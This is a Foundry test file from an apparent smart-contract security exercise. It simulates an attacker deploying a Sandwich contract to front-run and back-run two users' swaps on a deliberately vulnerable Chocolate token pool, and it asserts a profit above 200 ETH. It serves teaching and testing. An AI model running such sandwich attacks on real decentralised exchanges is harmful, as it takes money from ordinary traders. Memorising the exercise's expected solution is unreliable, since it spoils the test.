// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/15. FrontRunning-3/Chocolate.sol";
import "../../src/15. FrontRunning-3/Sandwich.sol";

/**
 * @dev run "forge test --mc TestFR3 -vvvv --fork-url $MAINNET_RPC_URL --fork-block-number 15969633"
 */
contract TestFR3 is Test {
    Chocolate public chocolate;

    Sandwich public sandwich;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address attacker = makeAddr("attacker");

    address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 constant INITIAL_MINT = 1000000 ether;
    uint256 constant INITIAL_LIQUIDITY = 100000 ether;
    uint256 constant ETH_IN_LIQUIDITY = 100 ether;
    uint256 constant USER1_SWAP = 120 ether;
    uint256 constant USER2_SWAP = 100 ether;

    uint256 attackerInitialETHBalance;

    function setUp() public {
        /**
         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
         */
        // Everyone starts with 300 ETH
        vm.deal(deployer, 300 ether);
        vm.deal(user1, 300 ether);
        vm.deal(user2, 300 ether);
        vm.deal(attacker, 300 ether);

        // Deploy Chocolate contract
        vm.startPrank(deployer);
        chocolate = new Chocolate(INITIAL_MINT);
        vm.stopPrank();

        // Deployer adds initial liquidity
        vm.startPrank(deployer);
        chocolate.approve(address(chocolate), INITIAL_LIQUIDITY);
        chocolate.addChocolateLiquidity{value: ETH_IN_LIQUIDITY}(INITIAL_LIQUIDITY);
        vm.stopPrank();

        attackerInitialETHBalance = attacker.balance;
    }

    function test_deployer_adds_liquidity_and_users_swap_and_attacker_sandwiches() public {
        // record attacker initial balance
        uint256 attackerInitialBalance = attacker.balance;

        // Deploy Sandwich from attacker
        vm.prank(attacker);
        sandwich = new Sandwich(WETH_ADDRESS, address(chocolate));

        // Attacker front-run: buy Chocolates
        vm.prank(attacker);
        sandwich.sandwich{value: 200 ether}(true);

        // Simulate User1 swapping 120 ETH to Chocolate
        vm.prank(user1);
        chocolate.swapChocolates{value: USER1_SWAP}(WETH_ADDRESS, USER1_SWAP);

        // Simulate User2 swapping 100 ETH to Chocolate
        vm.prank(user2);
        chocolate.swapChocolates{value: USER2_SWAP}(WETH_ADDRESS, USER2_SWAP);

        // Attacker back-run: sell Chocolates
        vm.prank(attacker);
        sandwich.sandwich(false);

        // Burnless: mine a block (not strictly needed in forge unit test)
        // check attacker balance increased
        uint256 attackerFinalBal = attacker.balance;

        emit log_named_uint("attackerInitialBalance", attackerInitialBalance);
        emit log_named_uint("attackerFinalBalance", attackerFinalBal);

        // As in your original JS test you expected > initial + 200 ETH:
        // (keep same check; if your parameters change you may want to relax this)
        assertGt(attackerFinalBal, attackerInitialBalance + 200 ether, "attacker did not make expected profit");
    }
}
